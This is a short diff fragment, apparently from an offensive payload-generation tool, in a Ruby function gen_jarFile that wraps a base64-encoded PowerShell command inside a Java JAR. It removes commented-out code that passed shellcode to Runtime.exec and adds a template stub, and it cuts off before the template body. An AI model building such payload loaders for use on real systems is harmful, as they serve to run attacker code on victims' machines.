@@ -14,10 +14,7 @@ end
 #######################################################################################################################
 #This first is for creating a jar file that executes the base64 encoded powershell syntax
 def gen_jarFile (base64Command, fileName)
-        #Strips out the \n char that unicorn adds at the end
-        #Building the .java one liner
-#       javaFile1 = 'import java.io.*;public class ' + fileName + '{public static void main(String args[]){try{Process p = Runtime.getRuntime().exec("'
-#        javaFile2 = javaFile1 + shellcode + '");}catch(IOException e1){}}}'
+        #Java Code with a temp string to replace with the base64Command
 	javaStr = <<-EOS
 import java.io.*;
 
